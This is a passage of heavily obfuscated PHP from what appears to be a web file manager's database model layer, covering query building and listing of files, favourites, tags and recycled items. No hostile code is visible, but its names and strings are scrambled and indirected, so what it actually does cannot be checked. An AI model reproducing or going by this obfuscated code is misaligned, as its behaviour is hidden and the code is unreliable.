$·°»Çû½) { $úÄÛ—«© =& $_SERVER[÷ôÚîå]; if (!0 === $·°»Çû½) { $»Ëë¬Ì = $this->_parseOptions(); $³¯Ã‡“  = $this->db->parseSql($³¯Ã‡“ , $»Ëë¬Ì); } elseif (is_array($·°»Çû½)) { $·°»Çû½ = array_map(array($this->db, $úÄÛ—«©[428]), $·°»Çû½); $³¯Ã‡“  = vsprintf($³¯Ã‡“ , $·°»Çû½); } else { $³¯Ã‡“  = strtr($³¯Ã‡“ , array($úÄÛ—«©[429] => $this->getTableName(), $úÄÛ—«©[430] => think_config($úÄÛ—«©[330]))); } $this->db->setModel($this->name); return $³¯Ã‡“ ; } public function db($£·ıóÑ = '', $ªò¶…Ş = '', $½œ²­Ş¿ = array()) { $…¹²´³Ã =& $_SERVER[÷ôÚîå]; if ($…¹²´³Ã[12] === $£·ıóÑ && $this->db) { return $this->db; } static $Üº‘‘¹• = array(); static $ÏõûÇ´² = array(); if (!isset($ÏõûÇ´²[$£·ıóÑ]) || isset($ÏõûÇ´²[$£·ıóÑ]) && $ªò¶…Ş && $Üº‘‘¹•[$£·ıóÑ] != $ªò¶…Ş) { if (!empty($ªò¶…Ş) && is_string($ªò¶…Ş) && !1 === strpos($ªò¶…Ş, $…¹²´³Ã[8])) { $ªò¶…Ş = think_config($ªò¶…Ş); } $£·ıóÑ = think_guid($ªò¶…Ş); $ÏõûÇ´²[$£·ıóÑ] = Db::getInstance($ªò¶…Ş); } elseif (NULL === $ªò¶…Ş) { $ÏõûÇ´²[$£·ıóÑ]->close(); unset($ÏõûÇ´²[$£·ıóÑ]); return; } if (!empty($½œ²­Ş¿)) { if (is_string($½œ²­Ş¿)) { parse_str($½œ²­Ş¿, $½œ²­Ş¿); } foreach ($½œ²­Ş¿ as $Ü‰óª•· => $¯ã‰ƒ) { $this->setProperty($Ü‰óª•·, $¯ã‰ƒ); } } $Üº‘‘¹•[$£·ıóÑ] = $ªò¶…Ş; $this->db = $ÏõûÇ´²[$£·ıóÑ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Æáºï»î = get_class($this); if ($Æáºï»î == $_SERVER[÷ôÚîå][431]) { return $this->name; } $this->name = substr($Æáºï»î, 0, -5); } return $this->name; } public function getTableName() { $¸á•ö« =& $_SERVER[÷ôÚîå]; if (empty($this->trueTableName)) { $İò°×§ò = !empty($this->tablePrefix) ? $this->tablePrefix : $¸á•ö«[12]; if (!empty($this->tableName)) { $İò°×§ò .= $this->tableName; } else { $İò°×§ò .= think_parse_name($this->name); } $this->trueTableName = strtolower($İò°×§ò); } return (!empty($this->dbName) ? $this->dbName . $¸á•ö«[10] : $¸á•ö«[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $æà“ÊÇ =& $_SERVER[÷ôÚîå]; return isset($this->fields[$æà“ÊÇ[337]]) ? $this->fields[$æà“ÊÇ[337]] : $this->pk; } public function getDbFields() { $ş±·Ö’ =& $_SERVER[÷ôÚîå]; if (isset($this->options[$ş±·Ö’[365]])) { $°¬ÓÓÔ¼ = $this->db->getFields($this->options[$ş±·Ö’[365]]); return $°¬ÓÓÔ¼ ? array_keys($°¬ÓÓÔ¼) : !1; } if ($this->fields) { $°¬ÓÓÔ¼ = $this->fields; unset($°¬ÓÓÔ¼[$ş±·Ö’[336]], $°¬ÓÓÔ¼[$ş±·Ö’[337]], $°¬ÓÓÔ¼[$ş±·Ö’[338]], $°¬ÓÓÔ¼[$ş±·Ö’[335]]); return $°¬ÓÓÔ¼; } return !1; } public function data($Ùñ™ã—Ğ = '') { $æş½©Ø =& $_SERVER[÷ôÚîå]; if ($æş½©Ø[12] === $Ùñ™ã—Ğ && !empty($this->data)) { return $this->data; } if (is_object($Ùñ™ã—Ğ)) { $Ùñ™ã—Ğ = get_object_vars($Ùñ™ã—Ğ); } elseif (is_string($Ùñ™ã—Ğ)) { parse_str($Ùñ™ã—Ğ, $Ùñ™ã—Ğ); } elseif (!is_array($Ùñ™ã—Ğ)) { think_exception(think_lang($æş½©Ø[357])); } $this->data = $Ùñ™ã—Ğ; return $this; } public function join($šñğ¦¦†) { $¸ÃÏ¦¸Í =& $_SERVER[÷ôÚîå]; if (is_array($šñğ¦¦†)) { $this->options[$¸ÃÏ¦¸Í[368]] = $šñğ¦¦†; } elseif (!empty($šñğ¦¦†)) { $this->options[$¸ÃÏ¦¸Í[368]][] = $šñğ¦¦†; } return $this; } public function union($Ìû‚Îñå, $ÜÚôÀÕÊ = false) { $á¾éõ†À =& $_SERVER[÷ôÚîå]; if (empty($Ìû‚Îñå)) { return $this; } if ($ÜÚôÀÕÊ) { $this->options[$á¾éõ†À[432]][$á¾éõ†À[433]] = !0; } if (is_object($Ìû‚Îñå)) { $Ìû‚Îñå = get_object_vars($Ìû‚Îñå); } if (is_string($Ìû‚Îñå)) { $²œø¯†¹ = $Ìû‚Îñå; } elseif (is_array($Ìû‚Îñå)) { if (isset($Ìû‚Îñå[0])) { $this->options[$á¾éõ†À[432]] = array_merge($this->options[$á¾éõ†À[432]], $Ìû‚Îñå); return $this; } else { $²œø¯†¹ = $Ìû‚Îñå; } } else { think_exception(think_lang($á¾éõ†À[357])); } $this->options[$á¾éõ†À[432]][] = $²œø¯†¹; return $this; } public function cache($§œŠ¨– = true, $°×ºàŞã = null, $×ÖÑêà§ = '') { $›İı®ç¼ =& $_SERVER[÷ôÚîå]; if (!1 !== $§œŠ¨–) { $this->options[$›İı®ç¼[434]] = array($›İı®ç¼[107] => $§œŠ¨–, $›İı®ç¼[424] => $°×ºàŞã, $›İı®ç¼[33] => $×ÖÑêà§); } return $this; } public function field($Œ¿àÛ¡, $ÙÁ½Ô¦± = false) { $Ü«Õ«Ï¼ =& $_SERVER[÷ôÚîå]; if (!0 === $Œ¿àÛ¡) { $‰‡Ê²âÑ = $this->getDbFields(); $Œ¿àÛ¡ = $‰‡Ê²âÑ ? $‰‡Ê²âÑ : $Ü«Õ«Ï¼[230]; } elseif ($ÙÁ½Ô¦±) { if (is_string($Œ¿àÛ¡)) { $Œ¿àÛ¡ = explode($Ü«Õ«Ï¼[50], $Œ¿àÛ¡); } $‰‡Ê²âÑ = $this->getDbFields(); $Œ¿àÛ¡ = $‰‡Ê²âÑ ? array_diff($‰‡Ê²âÑ, $Œ¿àÛ¡) : $Œ¿àÛ¡; } $this->options[$Ü«Õ«Ï¼[359]] = $Œ¿àÛ¡; return $this; } public function scope($­û’ãëá = '', $Ò‡õƒ¢• = NULL) { $ÃÇª‚¸³ =& $_SERVER[÷ôÚîå]; if ($ÃÇª‚¸³[12] === $­û’ãëá) { if (isset($this->_scope[$ÃÇª‚¸³[37]])) { $îô¶ùš£ = $this->_scope[$ÃÇª‚¸³[37]]; } else { return $this; } } elseif (is_string($­û’ãëá)) { $üèéĞ = explode($ÃÇª‚¸³[50], $­û’ãëá); $îô¶ùš£ = array(); foreach ($üèéĞ as $¥šĞöš—) { if (!isset($this->_scope[$¥šĞöš—])) { continue; } $îô¶ùš£ = array_merge($îô¶ùš£, $this->_scope[$¥šĞöš—]); } if (!empty($Ò‡õƒ¢•) && is_array($Ò‡õƒ¢•)) { $îô¶ùš£ = array_merge($îô¶ùš£, $Ò‡õƒ¢•); } } elseif (is_array($­û’ãëá)) { $îô¶ùš£ = $­û’ãëá; } if (is_array($îô¶ùš£) && !empty($îô¶ùš£)) { $this->options = array_merge($this->options, array_change_key_case($îô¶ùš£)); } return $this; } public function where($í„ÜÂ, $Ò†Üè¤É = null) { $Â¯À´­Ò =& $_SERVER[÷ôÚîå]; if (!is_null($Ò†Üè¤É) && is_string($í„ÜÂ)) { if (!is_array($Ò†Üè¤É)) { $Ò†Üè¤É = func_get_args(); array_shift($Ò†Üè¤É); } $Ò†Üè¤É = array_map(array($this->db, $Â¯À´­Ò[428]), $Ò†Üè¤É); $í„ÜÂ = vsprintf($í„ÜÂ, $Ò†Üè¤É); } elseif (is_object($í„ÜÂ)) { $í„ÜÂ = get_object_vars($í„ÜÂ); } elseif (is_array($í„ÜÂ)) { foreach ($í„ÜÂ as $¨éÍ²ß => $ûéŠôÊ“) { if ((is_numeric($¨éÍ²ß) || !$¨éÍ²ß) && is_string($ûéŠôÊ“)) { if (strpos($ûéŠôÊ“, $Â¯À´­Ò[435]) === 0) { continue; } think_trace($Â¯À´­Ò[436], $Â¯À´­Ò[12], $Â¯À´­Ò[49]); die; } } } if (is_string($í„ÜÂ) && $Â¯À´­Ò[12] != $í„ÜÂ) { $‚°Ó½µş = array(); $‚°Ó½µş[$Â¯À´­Ò[437]] = $í„ÜÂ; $í„ÜÂ = $‚°Ó½µş; } if (isset($this->options[$Â¯À´­Ò[361]])) { $this->options[$Â¯À´­Ò[361]] = array_merge($this->options[$Â¯À´­Ò[361]], $í„ÜÂ); } else { $this->options[$Â¯À´­Ò[361]] = $í„ÜÂ; } return $this; } public function limit($¸«ÏäõŠ, $¿óÕŠ’ = null) { $²Èï£ĞÇ =& $_SERVER[÷ôÚîå]; $this->options[$²Èï£ĞÇ[377]] = is_null($¿óÕŠ’) ? $¸«ÏäõŠ : $¸«ÏäõŠ . $²Èï£ĞÇ[50] . $¿óÕŠ’; return $this; } public function page($¹Ø”ªËç, $‚±°§Á¸ = null) { $şˆàÕÆ =& $_SERVER[÷ôÚîå]; $this->options[$şˆàÕÆ[438]] = is_null($‚±°§Á¸) ? $¹Ø”ªËç : $¹Ø”ªËç . $şˆàÕÆ[50] . $‚±°§Á¸; return $this; } public function comment($Í¼ÔÏÂ) { $this->options[$_SERVER[÷ôÚîå][439]] = $Í¼ÔÏÂ; return $this; } public function setProperty($‘µ§ËÅ, $€™–­š) { if (property_exists($this, $‘µ§ËÅ)) { $this->{$‘µ§ËÅ} = $€™–­š; } return $this; } } goto bˆ¬‰—ñ; f„«ÑªÓèÕ: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\x72\x63\145"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\155\145" => "\x69\x6f\x5f\x73\157\x75\162\x63\x65\137\155\x65\x74\x61", "\x6d\x65\x74\x61\106\x69\x65\154\x64" => "\x73\157\x75\162\143\145\x49\104"); protected $dataAuto = array(array("\155\x6f\144\x69\146\171\124\151\x6d\x65", "\164\x69\x6d\145", "\151\156\163\145\162\x74", "\146\x75\156\143\164\x69\157\x6e"), array("\143\162\x65\x61\x74\x65\124\x69\x6d\x65", "\164\151\x6d\x65", "\151\156\x73\x65\x72\164", "\x66\165\x6e\143\164\x69\157\x6e"), array("\x76\x69\x65\x77\x54\x69\155\145", "\x74\x69\155\145", "\151\156\163\x65\x72\164", "\x66\165\156\x63\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($óÑÕğŸ) { return $this->listSource(array($_SERVER[÷ôÚîå][486] => $óÑÕğŸ)); } public function typeName($íóÒ¼İÕ) { static $³¢Ä”” = array(self::TYPE_SYSTEM => "\x73\171\163\x74\x65\x6d", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\x67\162\x6f\x75\160"); return $³¢Ä””[$íóÒ¼İÕ . $_SERVER[÷ôÚîå][12]]; } public function sourceListInfo($œÍı† , $‘ºÇ£Œ† = false) { $àãëçß¤ =& $_SERVER[÷ôÚîå]; $œÍı†  = $œÍı†  ? $œÍı†  : array(); $œÍı†  = array_filter(array_unique($œÍı† )); if (!$œÍı† ) { return array(); } $ª†ÙŒµå = $this->where(array($àãëçß¤[203] => array($àãëçß¤[7], $œÍı† )))->select(); $this->_listDataApply($ª†ÙŒµå, $‘ºÇ£Œ†); return array_to_keyvalue($ª†ÙŒµå, $àãëçß¤[203]); } public function pathInfoFilter(&$«—ÁÈŸ­) { $ßˆè¾§â =& $_SERVER[÷ôÚîå]; static $§óÛ»Î‡ = false; static $çÂÆ¤½ƒ = false; static $äÂıîÍ  = false; if (!$§óÛ»Î‡) { $Ôá¨· É = $ßˆè¾§â[487]; $Ôá¨· É .= $ßˆè¾§â[488]; $Ôá¨· É .= $ßˆè¾§â[489]; $Ä½Ã©ø = $ßˆè¾§â[490]; $ÕÏĞ™‚ = explode($ßˆè¾§â[50], $Ä½Ã©ø); $§óÛ»Î‡ = explode($ßˆè¾§â[50], $Ôá¨· É); $çÂÆ¤½ƒ = array(); foreach ($§óÛ»Î‡ as $ƒ’ÅØ§î) { if (in_array($ƒ’ÅØ§î, $ÕÏĞ™‚)) { continue; } $çÂÆ¤½ƒ[] = $ƒ’ÅØ§î; } $äÂıîÍ  = explode($ßˆè¾§â[50], $ßˆè¾§â[491]); } foreach ($äÂıîÍ  as $öÂÃÖ¯Š) { if (isset($«—ÁÈŸ­[$öÂÃÖ¯Š])) { $«—ÁÈŸ­[$öÂÃÖ¯Š] = intval($«—ÁÈŸ­[$öÂÃÖ¯Š]); } } $«—ÁÈŸ­[$ßˆè¾§â[97]] = $ßˆè¾§â[492] . $«—ÁÈŸ­[$ßˆè¾§â[203]] . $ßˆè¾§â[493]; $«—ÁÈŸ­[$ßˆè¾§â[33]] = $«—ÁÈŸ­[$ßˆè¾§â[494]] == 1 ? $ßˆè¾§â[88] : $ßˆè¾§â[240]; $«—ÁÈŸ­[$ßˆè¾§â[200]] = $this->typeName($«—ÁÈŸ­[$ßˆè¾§â[200]]); if ($«—ÁÈŸ­[$ßˆè¾§â[494]] != 1) { $«—ÁÈŸ­[$ßˆè¾§â[179]] = $«—ÁÈŸ­[$ßˆè¾§â[495]]; unset($«—ÁÈŸ­[$ßˆè¾§â[495]]); } $äƒå™ê = $§óÛ»Î‡; if (isset($«—ÁÈŸ­[$ßˆè¾§â[496]]) && $«—ÁÈŸ­[$ßˆè¾§â[496]][$ßˆè¾§â[497]] == -1) { $äƒå™ê = $çÂÆ¤½ƒ; } $«—ÁÈŸ­ = array_field_key($«—ÁÈŸ­, $äƒå™ê); return $«—ÁÈŸ­; } public function listUserFav() { $µµ±€½ =& $_SERVER[÷ôÚîå]; $ùøœø°¥ = Model($µµ±€½[498])->listData(); $Ï±íİ£ì = array_filter_by_field($ùøœø°¥, $µµ±€½[33], $µµ±€½[499]); $Ï±íİ£ì = array_to_keyvalue($Ï±íİ£ì, $µµ±€½[12], $µµ±€½[97]); if ($Ï±íİ£ì) { $şß¤æİÀ = $this->listSource(array($µµ±€½[500] => array($µµ±€½[501], $Ï±íİ£ì))); } $şß¤æİÀ = array_to_keyvalue($şß¤æİÀ[$µµ±€½[454]], $µµ±€½[203]); foreach ($ùøœø°¥ as &$À ¯±„) { $À ¯±„ = array($µµ±€½[502] => $À ¯±„[$µµ±€½[484]], $µµ±€½[503] => $À ¯±„[$µµ±€½[32]], $µµ±€½[504] => $À ¯±„[$µµ±€½[97]], $µµ±€½[505] => $À ¯±„[$µµ±€½[33]], $µµ±€½[506] => $À ¯±„[$µµ±€½[241]], $µµ±€½[507] => $À ¯±„[$µµ±€½[98]]); if ($À ¯±„[$µµ±€½[33]] == $µµ±€½[499] && $şß¤æİÀ[$À ¯±„[$µµ±€½[97]]]) { $À ¯±„[$µµ±€½[100]] = $şß¤æİÀ[$À ¯±„[$µµ±€½[97]]]; } } unset($À ¯±„); return $ùøœø°¥; } public function listUserTag($ÙŒÙâı´) { $ÏŠ²‹ë™ =& $_SERVER[÷ôÚîå]; if ($ÙŒÙâı´ && !is_array($ÙŒÙâı´)) { $ÙŒÙâı´ = array($ÙŒÙâı´); } $ö°ÍË = Model($ÏŠ²‹ë™[508])->listData(); $æ‹»ğá = array(); $‘ƒéŞ¬³ = array(); foreach ($ö°ÍË as $æÚûˆ´Ê) { $£ò™Õ£ = $æÚûˆ´Ê[$ÏŠ²‹ë™[97]]; if (!$£ò™Õ£) { continue; } if (!isset($‘ƒéŞ¬³[$£ò™Õ£])) { $‘ƒéŞ¬³[$£ò™Õ£] = array(); } $‘ƒéŞ¬³[$£ò™Õ£][] = $æÚûˆ´Ê[$ÏŠ²‹ë™[509]]; $æ‹»ğá[$æÚûˆ´Ê[$ÏŠ²‹ë™[97]]] = $æÚûˆ´Ê; } $æğÈ±óå = array(); $ğ¿»¨€‰ = array(); $ìî²–±Ê = array(); foreach ($‘ƒéŞ¬³ as $ƒæİÈÉ => $æŞÕüë¬) { $»÷¿×Ÿ = !0; if (!$ÙŒÙâı´) { $æğÈ±óå[] = $ƒæİÈÉ; continue; } foreach ($ÙŒÙâı´ as $¯üøïÊ½) { if (!in_array($¯üøïÊ½, $æŞÕüë¬)) { $»÷¿×Ÿ = !1; break; } } if (!$»÷¿×Ÿ) { continue; } if (!is_numeric($ƒæİÈÉ)) { $‡öÔôü = $æ‹»ğá[$ƒæİÈÉ]; $è‰ËˆŠ­ = array($ÏŠ²‹ë™[32] => $‡öÔôü[$ÏŠ²‹ë™[32]], $ÏŠ²‹ë™[97] => $‡öÔôü[$ÏŠ²‹ë™[97]], $ÏŠ²‹ë™[33] => $‡öÔôü[$ÏŠ²‹ë™[33]], $ÏŠ²‹ë™[100] => array($ÏŠ²‹ë™[510] => 1), $ÏŠ²‹ë™[242] => !0); if ($‡öÔôü[$ÏŠ²‹ë™[33]] == $ÏŠ²‹ë™[240]) { $ìî²–±Ê[] = $è‰ËˆŠ­; } if ($‡öÔôü[$ÏŠ²‹ë™[33]] == $ÏŠ²‹ë™[88]) { $ğ¿»¨€‰[] = $è‰ËˆŠ­; } continue; } $æğÈ±óå[] = $ƒæİÈÉ; } if ($æğÈ±óå) { $öÈ»é¸„ = $this->listSource(array($ÏŠ²‹ë™[500] => array($ÏŠ²‹ë™[501], $æğÈ±óå))); } $öÈ»é¸„ = $öÈ»é¸„ ? $öÈ»é¸„ : array($ÏŠ²‹ë™[95] => array(), $ÏŠ²‹ë™[96] => array()); $öÈ»é¸„[$ÏŠ²‹ë™[95]] = array_merge($öÈ»é¸„[$ÏŠ²‹ë™[95]], $ğ¿»¨€‰); $öÈ»é¸„[$ÏŠ²‹ë™[96]] = array_merge($öÈ»é¸„[$ÏŠ²‹ë™[96]], $ìî²–±Ê); if (isset($öÈ»é¸„[$ÏŠ²‹ë™[451]]) && count($æğÈ±óå) == $öÈ»é¸„[$ÏŠ²‹ë™[451]][$ÏŠ²‹ë™[452]]) { return $öÈ»é¸„; } $¨ƒ«©¿ö = array(); $üÅúê›ø = array_to_keyvalue($öÈ»é¸„[$ÏŠ²‹ë™[95]], $ÏŠ²‹ë™[12], $ÏŠ²‹ë™[203]); $„‘Å¨áİ = array_to_keyvalue($öÈ»é¸„[$ÏŠ²‹ë™[96]], $ÏŠ²‹ë™[12], $ÏŠ²‹ë™[203]); $§æóÉäô = array_merge($„‘Å¨áİ, $üÅúê›ø); foreach ($æğÈ±óå as $£ò™Õ£) { if (!in_array($£ò™Õ£, $§æóÉäô)) { $¨ƒ«©¿ö[] = $£ò™Õ£; } } if ($¨ƒ«©¿ö) { Model($ÏŠ²‹ë™[511])->removeBySource($¨ƒ«©¿ö); } return $öÈ»é¸„; } public function listUserRecycle() { $‘Ì µü‰ =& $_SERVER[÷ôÚîå]; $š®à¼šÉ = Model($‘Ì µü‰[512])->listData(); if (!$š®à¼šÉ) { return array(); } $Û†—úŸÚ = array($‘Ì µü‰[500] => array($‘Ì µü‰[501], $š®à¼šÉ), $‘Ì µü‰[513] => 1); return $this->listSource($Û†—úŸÚ); } public function listSource($…ŒÔíí, $êõÃÒ¯ = 3000, $Ä ³Ë±¬ = false) { $ÑñšÅŒ =& $_SERVER[÷ôÚîå]; if (!isset($…ŒÔíí[$ÑñšÅŒ[514]])) { $…ŒÔíí[$ÑñšÅŒ[514]] = 0; } if (isset($…ŒÔíí[$ÑñšÅŒ[202]]) && $…ŒÔíí[$ÑñšÅŒ[202]] == $ÑñšÅŒ[238]) { $…ŒÔíí[$ÑñšÅŒ[495]] = array($ÑñšÅŒ[416], $ÑñšÅŒ[515]); } $çøîÜıØ = $ÑñšÅŒ[516]; $²š™Ñ°İ = $this->field($çøîÜıØ)->_makeOrder()->where($…ŒÔíí)->selectPage($êõÃÒ¯); $this->_listPageCheck($²š™Ñ°İ, $çøîÜıØ, $…ŒÔíí); $this->_listDataApply($²š™Ñ°İ[$ÑñšÅŒ[454]], $Ä ³Ë±¬); $this->_listMake($²š™Ñ°İ); return $²š™Ñ°İ; } private function _listPageCheck(&$·’üµ£, $Š“¨Ğ×´, $§£éÏÙŒ) { $°í¶ü™Ç =& $_SERVER[÷ôÚîå]; if (!is_array($·’üµ£[$°í¶ü™Ç[451]])) { return; } $Œó‹Íº‘ = $·’üµ£[$°í¶ü™Ç[451]]; if ($Œó‹Íº‘[$°í¶ü™Ç[453]] <= 1) { return; } if ($Œó‹Íº‘[$°í¶ü™Ç[452]] >= 100000) { return; } if (Model($°í¶ü™Ç[517])->get($°í¶ü™Ç[518]) != $°í¶ü™Ç[519]) { return; } $Š“¨Ğ×´ = str_replace(array($°í¶ü™Ç[53], $°í¶ü™Ç[427], $°í¶ü™Ç[65]), $°í¶ü™Ç[12], $Š“¨Ğ×´); $Š“¨Ğ×´ = $°í¶ü™Ç[520] . str_replace($°í¶ü™Ç[50], $°í¶ü™Ç[521], $Š“¨Ğ×´) . $°í¶ü™Ç[522]; $×õÈ„·¢ = $°í¶ü™Ç[523]; $×õÈ„·¢ = $×õÈ„·¢ . $°í¶ü™Ç[524]; $Ğ²²ïæ– = $Œó‹Íº‘[$°í¶ü™Ç[448]] * ($Œó‹Íº‘[$°í¶ü™Ç[438]] - 1) . $°í¶ü™Ç[50] . $Œó‹Íº‘[$°í¶ü™Ç[448]]; $¥£Á—„İ = $this->_makeOrder(!0); $ÂÎ·á²» = $°í¶ü™Ç[520] . str_replace($°í¶ü™Ç[50], $°í¶ü™Ç[521], $¥£Á—„İ[0]); if (strpos($ÂÎ·á²», $°í¶ü™Ç[525])) { $ÂÎ·á²» = str_replace($°í¶ü™Ç[525], $°í¶ü™Ç[526], $ÂÎ·á²»); } else { $ÂÎ·á²» .= $°í¶ü™Ç[527] . $¥£Á—„İ[1]; } $Àú³¤¿× = array(); foreach ($§£éÏÙŒ as $ï¬Ö’ĞŠ => $Ôß·¤”¬) { $Àú³¤¿×[$°í¶ü™Ç[520] . $ï¬Ö’ĞŠ] = $Ôß·¤”¬; } $this->alias($°í¶ü™Ç[528])->field($Š“¨Ğ×´)->limit($Ğ²²ïæ–)->order($ÂÎ·á²»); $²æú€¸¯ = $this->join($×õÈ„·¢)->where($Àú³¤¿×)->select(); if ($²æú€¸¯) { $·’üµ£[$°í¶ü™Ç[454]] = $²æú€¸¯; } } protected function _makeOrder($šìáª”é = false) { $¸ÒíîÔÄ =& $_SERVER[÷ôÚîå]; $‰ÒÏ§– = Model($¸ÒíîÔÄ[529])->get($¸ÒíîÔÄ[530]); $íß­êå = Model($¸ÒíîÔÄ[529])->get($¸ÒíîÔÄ[531]); $Ú¹Ñà¢¡ = array($¸ÒíîÔÄ[532] => $¸ÒíîÔÄ[533], $¸ÒíîÔÄ[534] => $¸ÒíîÔÄ[535]); $şÀ†ï„Ï = array($¸ÒíîÔÄ[32] => $¸ÒíîÔÄ[32], $¸ÒíîÔÄ[89] => $¸ÒíîÔÄ[89], $¸ÒíîÔÄ[179] => $¸ÒíîÔÄ[495], $¸ÒíîÔÄ[536] => $¸ÒíîÔÄ[536], $¸ÒíîÔÄ[537] => $¸ÒíîÔÄ[538], $¸ÒíîÔÄ[241] => $¸ÒíîÔÄ[241], $¸ÒíîÔÄ[98] => $¸ÒíîÔÄ[98]); $ µèü´¹ = Input::get($¸ÒíîÔÄ[539], $¸ÒíîÔÄ[7], $‰ÒÏ§–, array_keys($şÀ†ï„Ï)); $ñıÏÊıË = Input::get($¸ÒíîÔÄ[540], $¸ÒíîÔÄ[7], $íß­êå, array_keys($Ú¹Ñà¢¡)); if (!in_array($ µèü´¹, array_keys($şÀ†ï„Ï))) { $ µèü´¹ = $¸ÒíîÔÄ[32]; } if (!in_array($ñıÏÊıË, array_keys($Ú¹Ñà¢¡))) { $ µèü´¹ = $¸ÒíîÔÄ[532]; } if ($ µèü´¹ == $¸ÒíîÔÄ[32]) { } $™¼ àº = $¸ÒíîÔÄ[541] . $şÀ†ï„Ï[$ µèü´¹] . $¸ÒíîÔÄ[53] . $Ú¹Ñà¢¡[$ñıÏÊıË]; $™¼ àº = rtrim(trim($™¼ àº), $¸ÒíîÔÄ[50]); if ($šìáª”é) { return array($™¼ àº, $Ú¹Ñà¢¡[$ñıÏÊıË]); } return $this->order($™¼ àº); } protected function _listDataApplyItem($Ôüäëùå, $ğûøøëş = false) { $Óë¢…ÜÚ = array($Ôüäëùå); $this->_listDataApply($Óë¢…ÜÚ, $ğûøøëş); return $Óë¢…ÜÚ[0]; } protected function _listDataApply(&$÷ÈÌİ¸‰, $ÆÅÎªšš = false) { $¡ã…¼òè =& $_SERVER[÷ôÚîå]; if (!$÷ÈÌİ¸‰) { $÷ÈÌİ¸‰ = array(); return; } $©ş„ ¶» = array_to_keyvalue($÷ÈÌİ¸‰, $¡ã…¼òè[12], $¡ã…¼òè[203]); $©ş„ ¶» = array_unique($©ş„ ¶»); $this->_listSourceCache($÷ÈÌİ¸‰); if (!$ÆÅÎªšš) { $this->_listAppendMeta($÷ÈÌİ¸‰, $©ş„ ¶»); $this->_listAppendFileMeta($÷ÈÌİ¸‰, $©ş„ ¶»); $this->_listAppendChildren($÷ÈÌİ¸‰, $©ş„ ¶»); } $this->_listAppendPath($÷ÈÌİ¸‰); $this->_listAppendAuth($÷ÈÌİ¸‰); $this->_listAppendSourceInfo($÷ÈÌİ¸‰, $©ş„ ¶»); $this->_listAppendUser($÷ÈÌİ¸‰); $this->_listFilterInfo($÷ÈÌİ¸‰, $ÆÅÎªšš); $this->_listAppendAuthSecret($÷ÈÌİ¸‰); } protected function _listSourceCache($±¥’¤‹î) { $êï‚ûƒú =& $_SERVER[÷ôÚîå]; foreach ($±¥’¤‹î as $‹È î †) { self::$cacheSourceInfo[$êï‚ûƒú[542] . $‹È î †[$êï‚ûƒú[203]]] = $‹È î †; } } protected function _listFilterInfo(&$ø³êÏØÉ, $û‡——øÙ = false) { $ø±ªÉÅ =& $_SERVER[÷ôÚîå]; foreach ($ø³êÏØÉ as &$™”Œ‹’˜) { $™”Œ‹’˜ = $this->pathInfoFilter($™”Œ‹’˜); self::$cachePathInfo[$ø±ªÉÅ[543] . intval($û‡——øÙ) . $ø±ªÉÅ[471] . $™”Œ‹’˜[$ø±ªÉÅ[203]]] = $™”Œ‹’˜; } unset($™”Œ‹’˜); } protected function _listMake(&$°‚œŸµõ) { $²Ò·ï˜ =& $_SERVER[÷ôÚîå]; $°‚œŸµõ[$²Ò·ï˜[95]] = array(); $°‚œŸµõ[$²Ò·ï˜[96]] = array(); foreach ($°‚œŸµõ[$²Ò·ï˜[454]] as $Ş¹æÌş) { $·í±ã¾Ò = $Ş¹æÌş[$²Ò·ï˜[494]] == 1 ? $²Ò·ï˜[95] : $²Ò·ï˜[96]; $°‚œŸµõ[$·í±ã¾Ò][] = $Ş¹æÌş; } unset($°‚œŸµõ[$²Ò·ï˜[454]]); } protected function _listAppendMeta(&$¤‰´ö³ø, $¶ä¾Ô¦€) { $è§é›£È =& $_SERVER[÷ôÚîå]; $ƒÃŸŠ­Î = array($è§é›£È[500] => array($è§é›£È[501], $¶ä¾Ô¦€)); $ŞË¤¯¹– = Model($è§é›£È[544])->field($è§é›£È[545])->where($ƒÃŸŠ­Î)->select(); if (!$ŞË¤¯¹–) { return; } $ôÇ“¸­Ô = array($è§é›£È[546], $è§é›£È[547], $è§é›£È[526]); $©¦ùä‚¾ = array(); foreach ($ŞË¤¯¹– as $â­ŸÒ¯) { if (!isset($©¦ùä‚¾[$â­ŸÒ¯[$è§é›£È[203]]])) { $©¦ùä‚¾[$â­ŸÒ¯[$è§é›£È[203]]] = array(); } if (in_array($â­ŸÒ¯[$è§é›£È[107]], $ôÇ“¸­Ô)) { continue; } $©¦ùä‚¾[$â­ŸÒ¯[$è§é›£È[203]]][$â­ŸÒ¯[$è§é›£È[107]]] = $â­ŸÒ¯[$è§é›£È[459]]; } foreach ($¤‰´ö³ø as &$º÷ø—§Ú) { $º÷ø—§Ú[$è§é›£È[548]] = !1; if (isset($©¦ùä‚¾[$º÷ø—§Ú[$è§é›£È[203]]])) { $º÷ø—§Ú[$è§é›£È[548]] = $©¦ùä‚¾[$º÷ø—§Ú[$è§é›£È[203]]]; } if ($this->fileIsLock($º÷ø—§Ú) && $º÷ø—§Ú[$è§é›£È[496]]) { $Í˜Š£ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $º÷ø—§Ú[$è§é›£È[496]][$è§é›£È[497]] = AuthModel::authDisable($º÷ø—§Ú[$è§é›£È[496]][$è§é›£È[497]], $Í˜Š£); $º÷ø—§Ú[$è§é›£È[496]][$è§é›£È[549]][$è§é›£È[496]] = $º÷ø—§Ú[$è§é›£È[496]][$è§é›£È[497]]; } } unset($º÷ø—§Ú); } protected function _listAppendFileMeta(&$¦ùáïï¤, $ğÓË¢ô…) { $¼ª€Ì” =& $_SERVER[÷ôÚîå]; $ÎÓ¢Šó = array_to_keyvalue($¦ùáïï¤, $¼ª€Ì”[12], $¼ª€Ì”[550]); $ÎÓ¢Šó = 